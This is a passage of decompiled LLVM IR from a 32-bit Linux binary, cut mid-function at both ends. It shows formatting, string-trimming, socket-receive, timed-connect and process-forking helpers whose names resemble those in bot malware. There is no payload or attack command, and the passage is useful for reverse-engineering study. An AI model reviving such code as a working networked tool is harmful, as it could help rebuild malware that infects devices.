  %v2_804885b = load i32, i32* %v1_804885b, align 4
  %v8_804888d = sext i32 %v2_804885b to i64
  %v9_804888d = call i32 @printi(i32 %tmp6, i64 %v8_804888d, i32 10, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048892 = add i32 %v9_804888d, %stack_var_-28.157
  br label %dec_label_pc_80488f5

dec_label_pc_8048897:                             ; preds = %dec_label_pc_8048846
  %v2_804889a = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_804889d = icmp eq i8 %v2_804889a, 99
  %v1_804889f = icmp eq i1 %v10_804889d, false
  br i1 %v1_804889f, label %dec_label_pc_80488f5, label %dec_label_pc_80488a1

dec_label_pc_80488a1:                             ; preds = %dec_label_pc_8048897
  %v1_80488a4 = add i32 %stack_var_12.156, 4
  %v1_80488ac = inttoptr i32 %stack_var_12.156 to i32*
  %v2_80488ac = load i32, i32* %v1_80488ac, align 4
  store i32 %v2_80488ac, i32* %stack_var_-6, align 4
  %v6_80488d0 = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_80488d5 = add i32 %v6_80488d0, %stack_var_-28.157
  br label %dec_label_pc_80488f5

dec_label_pc_80488da:                             ; preds = %dec_label_pc_8048685, %dec_label_pc_8048659
  %stack_var_8.2 = phi i8* [ %stack_var_8.458, %dec_label_pc_8048659 ], [ %v22_8048667, %dec_label_pc_8048685 ]
  %v2_80488dd = load i8, i8* %stack_var_8.2, align 1
  %v3_80488dd = zext i8 %v2_80488dd to i32
  %v4_80488ed = call i32 @printchar(i32* %arg1, i32 %v3_80488dd)
  %v4_80488f2 = add i32 %stack_var_-28.157, 1
  br label %dec_label_pc_80488f5

dec_label_pc_80488f5:                             ; preds = %dec_label_pc_8048897, %dec_label_pc_80488a1, %dec_label_pc_8048850, %dec_label_pc_80487fc, %dec_label_pc_80487a8, %dec_label_pc_8048754, %dec_label_pc_8048722, %dec_label_pc_80488da
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80488da ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048897 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80488a1 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048850 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487fc ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487a8 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048754 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048722 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.156, %dec_label_pc_80488da ], [ %stack_var_12.156, %dec_label_pc_8048897 ], [ %v1_80488a4, %dec_label_pc_80488a1 ], [ %v1_8048853, %dec_label_pc_8048850 ], [ %v1_80487ff, %dec_label_pc_80487fc ], [ %v1_80487ab, %dec_label_pc_80487a8 ], [ %v1_8048757, %dec_label_pc_8048754 ], [ %v1_8048700, %dec_label_pc_8048722 ]
  %stack_var_-28.0 = phi i32 [ %v4_80488f2, %dec_label_pc_80488da ], [ %stack_var_-28.157, %dec_label_pc_8048897 ], [ %v5_80488d5, %dec_label_pc_80488a1 ], [ %v5_8048892, %dec_label_pc_8048850 ], [ %v5_804883e, %dec_label_pc_80487fc ], [ %v5_80487ea, %dec_label_pc_80487a8 ], [ %v5_8048796, %dec_label_pc_8048754 ], [ %v5_8048742, %dec_label_pc_8048722 ]
  %v4_80488f5 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80488f5 = add i32 %v4_80488f5, 1
  %stack_var_8.4 = inttoptr i32 %v5_80488f5 to i8*
  %v2_80488fb = load i8, i8* %stack_var_8.4, align 1
  %v4_80488fe = icmp eq i8 %v2_80488fb, 0
  %v1_8048900 = icmp eq i1 %v4_80488fe, false
  br i1 %v1_8048900, label %dec_label_pc_8048659, label %dec_label_pc_8048906

dec_label_pc_8048906:                             ; preds = %dec_label_pc_80488f5, %dec_label_pc_8048667, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.157, %dec_label_pc_8048667 ], [ %stack_var_-28.0, %dec_label_pc_80488f5 ]
  %v4_8048906 = icmp eq i32* %arg1, null
  br i1 %v4_8048906, label %dec_label_pc_8048914, label %dec_label_pc_804890c

dec_label_pc_804890c:                             ; preds = %dec_label_pc_8048906
  %v2_804890f = load i32, i32* %arg1, align 4
  %v1_8048911 = inttoptr i32 %v2_804890f to i8*
  store i8 0, i8* %v1_8048911, align 1
  br label %dec_label_pc_8048914

dec_label_pc_8048914:                             ; preds = %dec_label_pc_8048906, %dec_label_pc_804890c
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80488f5, { 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_80486a9, { 1, 0 }
  uselistorder i8* %v22_8048667, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in55, { 1, 0 }
  uselistorder i32 %stack_var_12.156, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.157, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8048914, { 1, 0 }
  uselistorder label %dec_label_pc_80488f5, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8048722, { 1, 0 }
  uselistorder label %dec_label_pc_80486f3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486e9, { 1, 0 }
  uselistorder label %dec_label_pc_80486a9, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
}

define i32 @szprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048919 = load i32, i32* @ebp, align 4
  store i32 %v0_8048919, i32* %stack_var_-4, align 4
  %v4_8048919 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048919, i32* @ebp, align 4
  %v4_8048922 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048939 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048922)
  ret i32 %v4_8048939

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8048943 = load i32, i32* @edi, align 4
  store i32 %v0_8048943, i32* %stack_var_-8, align 4
  %v4_804894e = ptrtoint i8* %arg1 to i32
  %v3_804895f = call i32 @_strlen(i8* %arg1)
  %v1_8048966 = add i32 %v3_804895f, -1
  br label %dec_label_pc_804896f

dec_label_pc_804896c:                             ; preds = %dec_label_pc_804896f
  %v4_804896c = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804896f

dec_label_pc_804896f:                             ; preds = %entry, %dec_label_pc_804896c
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_804896c, %dec_label_pc_804896c ]
  %v6_8048972 = add i32 %stack_var_-16.0, %v4_804894e
  %v1_8048975 = inttoptr i32 %v6_8048972 to i8*
  %v2_8048975 = load i8, i8* %v1_8048975, align 1
  %v2_8048978 = sext i8 %v2_8048975 to i32
  %v2_804897b = mul nsw i32 %v2_8048978, 2
  %v0_804897f = load i32, i32* inttoptr (i32 134553656 to i32*), align 8
  %v2_8048984 = add i32 %v0_804897f, %v2_804897b
  %v1_8048987 = inttoptr i32 %v2_8048984 to i16*
  %v2_8048987 = load i16, i16* %v1_8048987, align 2
  %v1_804898a = and i16 %v2_8048987, 32
  %v2_804898a = icmp eq i16 %v1_804898a, 0
  %v1_804898f = icmp eq i1 %v2_804898a, false
  br i1 %v1_804898f, label %dec_label_pc_804896c, label %dec_label_pc_8048996.preheader

dec_label_pc_8048996.preheader:                   ; preds = %dec_label_pc_804896f
  %v5_804899c17 = icmp slt i32 %v1_8048966, %stack_var_-16.0
  br i1 %v5_804899c17, label %dec_label_pc_80489c0, label %dec_label_pc_804899e.lr.ph

dec_label_pc_804899e.lr.ph:                       ; preds = %dec_label_pc_8048996.preheader
  %v0_80489ae.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804899e

dec_label_pc_8048993:                             ; preds = %dec_label_pc_804899e
  %v4_8048993 = add i32 %stack_var_-12.018, -1
  %v5_804899c = icmp slt i32 %v4_8048993, %stack_var_-16.0
  br i1 %v5_804899c, label %dec_label_pc_80489c0, label %dec_label_pc_804899e

dec_label_pc_804899e:                             ; preds = %dec_label_pc_804899e.lr.ph, %dec_label_pc_8048993
  %stack_var_-12.018 = phi i32 [ %v1_8048966, %dec_label_pc_804899e.lr.ph ], [ %v4_8048993, %dec_label_pc_8048993 ]
  %v6_80489a1 = add i32 %stack_var_-12.018, %v4_804894e
  %v1_80489a4 = inttoptr i32 %v6_80489a1 to i8*
  %v2_80489a4 = load i8, i8* %v1_80489a4, align 1
  %v2_80489a7 = sext i8 %v2_80489a4 to i32
  %v2_80489aa = mul nsw i32 %v2_80489a7, 2
  %v2_80489b3 = add i32 %v0_80489ae.pre, %v2_80489aa
  %v1_80489b6 = inttoptr i32 %v2_80489b3 to i16*
  %v2_80489b6 = load i16, i16* %v1_80489b6, align 2
  %v1_80489b9 = and i16 %v2_80489b6, 32
  %v2_80489b9 = icmp eq i16 %v1_80489b9, 0
  %v1_80489be = icmp eq i1 %v2_80489b9, false
  br i1 %v1_80489be, label %dec_label_pc_8048993, label %dec_label_pc_80489c0

dec_label_pc_80489c0:                             ; preds = %dec_label_pc_8048993, %dec_label_pc_804899e, %dec_label_pc_8048996.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_8048966, %dec_label_pc_8048996.preheader ], [ %stack_var_-12.018, %dec_label_pc_804899e ], [ %v4_8048993, %dec_label_pc_8048993 ]
  %v7_80489e910 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  br i1 %v7_80489e910, label %dec_label_pc_80489eb, label %dec_label_pc_80489c8

dec_label_pc_80489c8:                             ; preds = %dec_label_pc_80489c0, %dec_label_pc_80489c8
  %v6_80489f312 = phi i32 [ %v6_80489f3, %dec_label_pc_80489c8 ], [ %v4_804894e, %dec_label_pc_80489c0 ]
  %storemerge11 = phi i32 [ %v4_80489e0, %dec_label_pc_80489c8 ], [ %stack_var_-16.0, %dec_label_pc_80489c0 ]
  %v6_80489d8 = add i32 %storemerge11, %v4_804894e
  %v1_80489db = inttoptr i32 %v6_80489d8 to i8*
  %v2_80489db = load i8, i8* %v1_80489db, align 1
  %v3_80489de = inttoptr i32 %v6_80489f312 to i8*
  store i8 %v2_80489db, i8* %v3_80489de, align 1
  %v4_80489e0 = add i32 %storemerge11, 1
  %v7_80489e9 = icmp sgt i32 %v4_80489e0, %stack_var_-12.0.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  %v2_80489f1 = sub i32 %v4_80489e0, %stack_var_-16.0
  %v6_80489f3 = add i32 %v2_80489f1, %v4_804894e
  br i1 %v7_80489e9, label %dec_label_pc_80489eb, label %dec_label_pc_80489c8

dec_label_pc_80489eb:                             ; preds = %dec_label_pc_80489c8, %dec_label_pc_80489c0
  %v6_80489f3.lcssa = phi i32 [ %v4_804894e, %dec_label_pc_80489c0 ], [ %v6_80489f3, %dec_label_pc_80489c8 ]
  %v22_80489f3 = inttoptr i32 %v6_80489f3.lcssa to i8*
  store i8 0, i8* %v22_80489f3, align 1
  %v2_80489fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489fc, i32* @edi, align 4
  ret i32 %v6_80489f3.lcssa

; uselistorder directives
  uselistorder i32 %v6_80489f3.lcssa, { 1, 0 }
  uselistorder i32 %v4_80489e0, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.018, { 0, 2, 1 }
  uselistorder i32 %v4_8048993, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 2, 1, 0, 5, 4, 3, 6, 7, 8 }
  uselistorder i32 %v1_8048966, { 2, 1, 0 }
  uselistorder i32 %v4_804894e, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80489c8, { 1, 0 }
  uselistorder label %dec_label_pc_80489c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804899e, { 1, 0 }
  uselistorder label %dec_label_pc_804896f, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_80489ff = load i32, i32* @ebp, align 4
  %v1_8048a0b = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048a0b, i32* %arg2, align 4
  %v10_8048a1c = icmp eq i32 %v1_8048a0b, -1
  %. = zext i1 %v10_8048a1c to i32
  store i32 %v0_80489ff, i32* @ebp, align 4
  ret i32 %.
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048a39 = load i32, i32* @edi, align 4
  store i32 %v0_8048a39, i32* %stack_var_-8, align 4
  %v4_8048a43 = ptrtoint i8* %arg2 to i32
  %v1_8048a4b = and i32 %v4_8048a43, -256
  %v5_8048a4d = call i8* @_memset(i8* %arg2, i32 %v1_8048a4b, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8048a6d = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_8048a74 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8048a81 = udiv i32 %arg1, 32
  %v1_8048a87 = urem i32 %arg1, 32
  %v0_8048a8a = load i32, i32* @ebp, align 4
  %v2_8048a8a = mul nuw nsw i32 %v2_8048a81, 4
  %v3_8048a8a = add nsw i32 %v2_8048a8a, -164
  %v4_8048a8a = add i32 %v3_8048a8a, %v0_8048a8a
  %v5_8048a8a = inttoptr i32 %v4_8048a8a to i32*
  %v6_8048a8a = load i32, i32* %v5_8048a8a, align 4
  %v9_8048a8a = shl i32 1, %v1_8048a87
  %v12_8048a8a = or i32 %v6_8048a8a, %v9_8048a8a
  store i32 %v12_8048a8a, i32* %v5_8048a8a, align 4
  %v1_8048a95 = add i32 %arg1, 1
  %v2_8048a96 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8048abf = call i32 @__libc_select(i32 %v1_8048a95, i32 %v2_8048a6d, i32 0, i32 %v2_8048a6d, i32 %v2_8048a96)
  %tmp33 = icmp slt i32 %v5_8048abf, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_8048b61, label %dec_label_pc_8048b57.preheader

dec_label_pc_8048b57.preheader:                   ; preds = %entry
  %v7_8048b5b43 = icmp sgt i32 %tmp11, 9
  br i1 %v7_8048b5b43, label %dec_label_pc_8048b61, label %dec_label_pc_8048ad6

dec_label_pc_8048ad6:                             ; preds = %dec_label_pc_8048b57.preheader, %dec_label_pc_8048b54
  %stack_var_-36.044 = phi i32 [ %v4_8048b54, %dec_label_pc_8048b54 ], [ %tmp11, %dec_label_pc_8048b57.preheader ]
  store i32 30, i32* %stack_var_-176, align 4
  store i1 false, i1* @df, align 1
  %v5_8048afb = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_8048b11 = load i32, i32* @ebp, align 4
  %v4_8048b11 = add i32 %v3_8048a8a, %v0_8048b11
  %v5_8048b11 = inttoptr i32 %v4_8048b11 to i32*
  %v6_8048b11 = load i32, i32* %v5_8048b11, align 4
  %v12_8048b11 = or i32 %v6_8048b11, %v9_8048a8a
  store i32 %v12_8048b11, i32* %v5_8048b11, align 4
  %v5_8048b46 = call i32 @__libc_select(i32 %v1_8048a95, i32 %v2_8048a6d, i32 0, i32 %v2_8048a6d, i32 %v2_8048a96)
  %tmp35 = icmp slt i32 %v5_8048b46, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8048b61, label %dec_label_pc_8048b54

dec_label_pc_8048b54:                             ; preds = %dec_label_pc_8048ad6
  %v4_8048b54 = add nsw i32 %stack_var_-36.044, 1
  %v7_8048b5b = icmp sgt i32 %stack_var_-36.044, 8
  br i1 %v7_8048b5b, label %dec_label_pc_8048b61, label %dec_label_pc_8048ad6

dec_label_pc_8048b61:                             ; preds = %dec_label_pc_8048b57.preheader, %dec_label_pc_8048ad6, %dec_label_pc_8048b54, %entry
  %v2_8048b85 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8048bcb

dec_label_pc_8048b70:                             ; preds = %dec_label_pc_8048bcb
  %v0_8048b70 = load i32, i32* @global_var_8052308.15, align 8
  %v4_8048b92 = call i32 @__libc_recv(i32 %v0_8048b70, i32 %v2_8048b85, i32 1, i32 0)
  %v9_8048b97 = icmp eq i32 %v4_8048b92, 1
  br i1 %v9_8048b97, label %dec_label_pc_8048bae, label %dec_label_pc_8048b9c

dec_label_pc_8048b9c:                             ; preds = %dec_label_pc_8048b70
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8048be8

dec_label_pc_8048bae:                             ; preds = %dec_label_pc_8048b70
  %v3_8048bae = load i8, i8* %stack_var_-177, align 1
  %v4_8048bb5 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8048bae, i8* %stack_var_-32.0, align 1
  %v5_8048bba = add i32 %v4_8048bb5, 1
  %v22_8048bba = inttoptr i32 %v5_8048bba to i8*
  %v3_8048bbd = load i8, i8* %stack_var_-177, align 1
  %v10_8048bc4 = icmp eq i8 %v3_8048bbd, 10
  br i1 %v10_8048bc4, label %dec_label_pc_8048bd9, label %dec_label_pc_8048bc8

dec_label_pc_8048bc8:                             ; preds = %dec_label_pc_8048bae
  %v4_8048bc8 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8048bcb

dec_label_pc_8048bcb:                             ; preds = %dec_label_pc_8048b61, %dec_label_pc_8048bc8
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_8048b61 ], [ %v22_8048bba, %dec_label_pc_8048bc8 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048b61 ], [ %v4_8048bc8, %dec_label_pc_8048bc8 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_8048b61 ], [ %v4_8048bcb, %dec_label_pc_8048bc8 ]
  %v4_8048bcb = add i32 %stack_var_12.0, -1
  %v9_8048bcb = sub i32 0, %stack_var_12.0
  %v10_8048bcb = and i32 %stack_var_12.0, %v9_8048bcb
  %v11_8048bcb = icmp slt i32 %v10_8048bcb, 0
  %v12_8048bcb = icmp eq i32 %v4_8048bcb, 0
  %v13_8048bcb = icmp slt i32 %v4_8048bcb, 0
  %v3_8048bcf = icmp eq i1 %v13_8048bcb, %v11_8048bcb
  %v4_8048bcf = icmp eq i1 %v12_8048bcb, false
  %v5_8048bcf = and i1 %v4_8048bcf, %v3_8048bcf
  %v4_8048bd5 = icmp eq i1 %v5_8048bcf, false
  %v1_8048bd7 = icmp eq i1 %v4_8048bd5, false
  br i1 %v1_8048bd7, label %dec_label_pc_8048b70, label %dec_label_pc_8048bd9

dec_label_pc_8048bd9:                             ; preds = %dec_label_pc_8048bae, %dec_label_pc_8048bcb
  %stack_var_-32.1 = phi i8* [ %v22_8048bba, %dec_label_pc_8048bae ], [ %stack_var_-32.0, %dec_label_pc_8048bcb ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_8048be8

dec_label_pc_8048be8:                             ; preds = %dec_label_pc_8048b9c, %dec_label_pc_8048bd9
  %storemerge = phi i32 [ -1, %dec_label_pc_8048b9c ], [ %stack_var_-28.0, %dec_label_pc_8048bd9 ]
  %v2_8048bf4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048bf4, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048bcb, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_8048bba, { 1, 0 }
  uselistorder i32 %v2_8048a6d, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048be8, { 1, 0 }
  uselistorder label %dec_label_pc_8048bd9, { 1, 0 }
  uselistorder label %dec_label_pc_8048bcb, { 1, 0 }
  uselistorder label %dec_label_pc_8048b61, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048ad6, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048bfa = load i32, i32* @edi, align 4
  store i32 %v0_8048bfa, i32* %stack_var_-8, align 4
  %v3_8048c17 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048c1f = or i32 %v3_8048c17, 2048
  %v3_8048c3b = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048c1f)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8048c4f = trunc i32 %arg3 to i16
  %v2_8048c4f = call i32 @htons(i16 %v1_8048c4f)
  store i32 %arg2, i32* @edx, align 4
  %v3_8048c6b = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8048c70 = icmp eq i32 %v3_8048c6b, 0
  br i1 %v1_8048c70, label %dec_label_pc_8048c83, label %dec_label_pc_8048df3

dec_label_pc_8048c83:                             ; preds = %entry
  %v2_8048c5e = ptrtoint i32* %stack_var_-40 to i32
  %v3_8048cab = call i32 @__libc_connect(i32 %arg1, i32 %v2_8048c5e, i32 16)
  %v5_8048cb3 = icmp slt i32 %v3_8048cab, 0
  %v1_8048cb7 = icmp eq i1 %v5_8048cb3, false
  br i1 %v1_8048cb7, label %dec_label_pc_8048daa, label %dec_label_pc_8048cbd

dec_label_pc_8048cbd:                             ; preds = %dec_label_pc_8048c83
  %v1_8048cbd = call i32 @__errno_location(i32 %v3_8048cab)
  %v1_8048cc2 = inttoptr i32 %v1_8048cbd to i32*
  %v2_8048cc2 = load i32, i32* %v1_8048cc2, align 4
  %v9_8048cc4 = icmp eq i32 %v2_8048cc2, 115
  %v1_8048cc7 = icmp eq i1 %v9_8048cc4, false
  br i1 %v1_8048cc7, label %dec_label_pc_8048df3, label %dec_label_pc_8048ccd

dec_label_pc_8048ccd:                             ; preds = %dec_label_pc_8048cbd
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8048cea = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048cea, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048cf1 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8048cfe = udiv i32 %arg1, 32
  %v1_8048d04 = urem i32 %arg1, 32
  %v0_8048d07 = load i32, i32* @ebp, align 4
  %v2_8048d07 = mul nuw nsw i32 %v2_8048cfe, 4
  %v3_8048d07 = add nsw i32 %v2_8048d07, -164
  %v4_8048d07 = add i32 %v3_8048d07, %v0_8048d07
  %v5_8048d07 = inttoptr i32 %v4_8048d07 to i32*
  %v6_8048d07 = load i32, i32* %v5_8048d07, align 4
  %v9_8048d07 = shl i32 1, %v1_8048d04
  %v12_8048d07 = or i32 %v6_8048d07, %v9_8048d07
  store i32 %v12_8048d07, i32* %v5_8048d07, align 4
  %v1_8048d12 = add i32 %arg1, 1
  %v2_8048d13 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8048d3a = call i32 @__libc_select(i32 %v1_8048d12, i32 0, i32 %v2_8048cea, i32 0, i32 %v2_8048d13)
  %tmp28 = icmp slt i32 %v5_8048d3a, 1
  br i1 %tmp28, label %dec_label_pc_8048df3, label %dec_label_pc_8048d43

dec_label_pc_8048d43:                             ; preds = %dec_label_pc_8048ccd
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8048d4d = ptrtoint i32* %stack_var_-180 to i32
  %v2_8048d57 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8048d77 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8048d57, i32 %v2_8048d4d)
  %v3_8048d7c = load i32, i32* %stack_var_-184, align 4
  %v1_8048d82 = icmp eq i32 %v3_8048d7c, 0
  br i1 %v1_8048d82, label %dec_label_pc_8048daa, label %dec_label_pc_8048df3

dec_label_pc_8048daa:                             ; preds = %dec_label_pc_8048d43, %dec_label_pc_8048c83
  %v3_8048dc0 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048dc8 = and i32 %v3_8048dc0, -2049
  %v3_8048de4 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048dc8)
  br label %dec_label_pc_8048df3

dec_label_pc_8048df3:                             ; preds = %dec_label_pc_8048cbd, %dec_label_pc_8048ccd, %dec_label_pc_8048d43, %entry, %dec_label_pc_8048daa
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8048daa ], [ 0, %entry ], [ 0, %dec_label_pc_8048d43 ], [ 0, %dec_label_pc_8048ccd ], [ 0, %dec_label_pc_8048cbd ]
  %v2_8048dff = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048dff, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8048df3, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8048e05 = load i32, i32* @ebx, align 4
  store i32 %v0_8048e05, i32* %stack_var_-8, align 4
  %v1_8048e09 = call i32 @__libc_fork(i32 %v0_8048e05)
  %v4_8048e11 = icmp eq i32 %v1_8048e09, 0
  %v1_8048e15 = icmp eq i1 %v4_8048e11, false
  br i1 %v1_8048e15, label %dec_label_pc_8048e22, label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %entry
  br label %dec_label_pc_8048efe

dec_label_pc_8048e22:                             ; preds = %entry
  %v0_8048e22 = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048e27 = load i32, i32* @global_var_8052304.17, align 4
  %v1_8048e2d = add i32 %v0_8048e22, 1
  %v5_8048e2d = icmp eq i32 %v0_8048e22, -1
  %v2_8048e30 = zext i1 %v5_8048e2d to i32
  %v3_8048e30 = add i32 %v2_8048e30, %v0_8048e27
  store i32 %v1_8048e2d, i32* @global_var_8052300.16, align 256
  store i32 %v3_8048e30, i32* @global_var_8052304.17, align 4
  %v2_8048e4d = mul i32 %v1_8048e2d, 4
  %v1_8048e50 = add i32 %v2_8048e4d, 4
  %v1_8048e56 = call i32 @malloc(i32 %v1_8048e50)
  br label %dec_label_pc_8048e89

dec_label_pc_8048e67:                             ; preds = %dec_label_pc_8048e89, %dec_label_pc_8048eba
  %v2_8048e6a = mul i32 %storemerge1, 4
  %v5_8048e6f = add i32 %v2_8048e6a, %v1_8048e56
  %v0_8048e7a = load i32, i32* @global_var_8054564.18, align 4
  %v2_8048e7f = add i32 %v0_8048e7a, %v2_8048e6a
  %v1_8048e82 = inttoptr i32 %v2_8048e7f to i32*
  %v2_8048e82 = load i32, i32* %v1_8048e82, align 4
  %v2_8048e84 = inttoptr i32 %v5_8048e6f to i32*
  store i32 %v2_8048e82, i32* %v2_8048e84, align 4
  %v4_8048e86 = add i32 %storemerge1, 1
  br label %dec_label_pc_8048e89

dec_label_pc_8048e89:                             ; preds = %dec_label_pc_8048e22, %dec_label_pc_8048e67
  %storemerge1 = phi i32 [ %v4_8048e86, %dec_label_pc_8048e67 ], [ 0, %dec_label_pc_8048e22 ]
  %v0_8048e97 = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048e9c = load i32, i32* @global_var_8052304.17, align 4
  %v4_8048ea6 = icmp ne i32 %v0_8048e97, 0
  %v2_8048ea9 = zext i1 %v4_8048ea6 to i32
  %v3_8048ea9 = add i32 %v0_8048e9c, -1
  %v4_8048ea9 = add i32 %v3_8048ea9, %v2_8048ea9
  store i32 %v4_8048ea9, i32* @ebx, align 4
